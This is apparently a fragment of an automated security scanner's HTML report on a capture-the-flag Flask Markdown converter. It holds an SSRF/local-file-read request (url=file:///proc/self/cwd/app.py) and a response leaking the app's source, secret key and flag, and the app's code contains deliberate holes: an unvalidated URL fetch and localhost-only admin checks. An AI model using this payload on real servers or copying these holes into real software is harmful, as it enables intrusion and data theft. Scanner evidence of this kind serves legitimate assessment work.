+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Markdown to HTML Converter&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Markdown to HTML Converter&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/convert&quot;&gt;
+            &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+            &lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;
+            &lt;br&gt;&lt;br&gt;
+            &lt;label for=&quot;markdown_text&quot;&gt;Or enter Markdown text:&lt;/label&gt;
+            &lt;textarea name=&quot;markdown_text&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;# Sample Markdown
+
+This is a paragraph with **bold** text and *italic* text.
+
+- Item 1
+- Item 2
+- Item 3
+
+
+        &lt;/textarea&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;button type=&quot;submit&quot;&gt;Convert&lt;/button&gt;
+    &lt;/form&gt;
+    
+        &lt;div class=&quot;result&quot;&gt;
+            &lt;p&gt;import os
+from flask import Flask, render_template, request, redirect, url_for, flash
+import urllib.request
+import markdown
+from flask import abort&lt;/p&gt;
+&lt;p&gt;app = Flask(&lt;strong&gt;name&lt;/strong&gt;)
+app.secret_key = 'supersecretkey'&lt;/p&gt;
+&lt;p&gt;FLAG = &quot;flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}&quot;&lt;/p&gt;
+&lt;p&gt;@app.route('/')
+def index():
+    return render_template('converter.html')&lt;/p&gt;
+&lt;p&gt;@app.route('/convert', methods=['POST'])
+def convert():
+    url = request.form.get('url')
+    markdown_text = request.form.get('markdown_text')&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if not url and not markdown_text:
+    flash('Either URL or Markdown text is required!')
+    return redirect(url_for('index'))
+
+try:
+    if url:
+        response = urllib.request.urlopen(url)
+        raw_data = response.read()
+        encoding = response.info().get_content_charset(failobj=&quot;utf-8&quot;)
+        content = raw_data.decode(encoding)
+    else:
+        content = markdown_text
+
+    try:
+        html_content = markdown.markdown(content)
+        return render_template('converter.html', html_content=html_content)
+    except Exception as e:
+        flash('Parsing error. Displaying non-Markdown content.')
+        return render_template('converter.html', raw_content=content)
+
+except Exception as e:
+    flash(f'Error fetching the URL: {e}')
+    return redirect(url_for('index'))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;@app.route('/admin')
+def admin():
+    if request.remote_addr != '127.0.0.1':
+        abort(403)  # Forbidden
+    return render_template('admin.html')&lt;/p&gt;
+&lt;p&gt;@app.route('/admin/flag')
+def admin_flag():
+    if request.remote_addr != '127.0.0.1':
+        abort(403)  # Forbidden
+    return render_template('flag.html', flag=FLAG)&lt;/p&gt;
+&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == '&lt;strong&gt;main&lt;/strong&gt;':
+    app.run(debug=False, host='0.0.0.0', port=80)&lt;/p&gt;
+        &lt;/div&gt;
+    
+    
+        
+    
+&lt;/main&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxuqhrk-q</code> — <code>artifacts/_/ev-mqxuqhrk-q/</code></div><div class="lbl">REQUEST</div><pre>POST /convert HTTP/1.1
+Host: target.local:32815
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=file:///proc/self/cwd/app.py</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 2628
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 13:55:59 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Markdown to HTML Converter&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Markdown to HTML Converter&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/convert&quot;&gt;
+            &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+            &lt;input type=&quot;url&quot; name=&quot;url&quot;&gt;
+            &lt;br&gt;&lt;br&gt;
+            &lt;label for=&quot;markdown_text&quot;&gt;Or enter Markdown text:&lt;/label&gt;
+            &lt;textarea name=&quot;markdown_text&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;# Sample Markdown
+
+This is a paragraph with **bold** text and *italic* text.
+
+- Item 1
+- Item 2
+- Item 3
+
+
+        &lt;/textarea&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;button type=&quot;submit&quot;&gt;Convert&lt;/button&gt;
+    &lt;/form&gt;
+    
+        &lt;div class=&quot;result&quot;&gt;
+            &lt;p&gt;import os
+from flask import Flask, render_template, request, redirect, url_for, flash
+import urllib.request
+import markdown
+from flask import abort&lt;/p&gt;
+&lt;p&gt;app = Flask(&lt;strong&gt;name&lt;/strong&gt;)
+app.secret_key = 'supersecretkey'&lt;/p&gt;
+&lt;p&gt;FLAG = &quot;flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}&quot;&lt;/p&gt;
+&lt;p&gt;@app.route('/')
+def index():
+    return render_template('converter.html')&lt;/p&gt;
+&lt;p&gt;@app.route('/convert', methods=['POST'])
+def convert():
+    url = request.form.get('url')
+    markdown_text = request.form.get('markdown_text')&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if not url and not markdown_text:
+    flash('Either URL or Markdown text is required!')
+    return redirect(url_for('index'))
+
+try:
+    if url:
+        response = urllib.request.urlopen(url)
+        raw_data = response.read()
+        encoding = response.info().get_content_charset(failobj=&quot;utf-8&quot;)
+        content = raw_data.decode(encoding)
+    else:
+        content = markdown_text
+
+    try:
+        html_content = markdown.markdown(content)
+        return render_template('converter.html', html_content=html_content)
+    except Exception as e:
+        flash('Parsing error. Displaying non-Markdown content.')
+        return render_template('converter.html', raw_content=content)
+
+except Exception as e:
+    flash(f'Error fetching the URL: {e}')
+    return redirect(url_for('index'))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;@app.route('/admin')
+def admin():
+    if request.remote_addr != '127.0.0.1':
+        abort(403)  # Forbidden
+    return render_template('admin.html')&lt;/p&gt;
+&lt;p&gt;@app.route('/admin/flag')
+def admin_flag():
+    if request.remote_addr != '127.0.0.1':
+        abort(403)  # Forbidden
+    return render_template('flag.html', flag=FLAG)&lt;/p&gt;
+&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == '&lt;strong&gt;main&lt;/strong&gt;':
+    app.run(debug=False, host='0.0.0.0', port=80)&lt;/p&gt;
+        &lt;/div&gt;
+    
+    
+        
+    
+&lt;/main&gt;</pre></div>
+</div>
+</body></html>
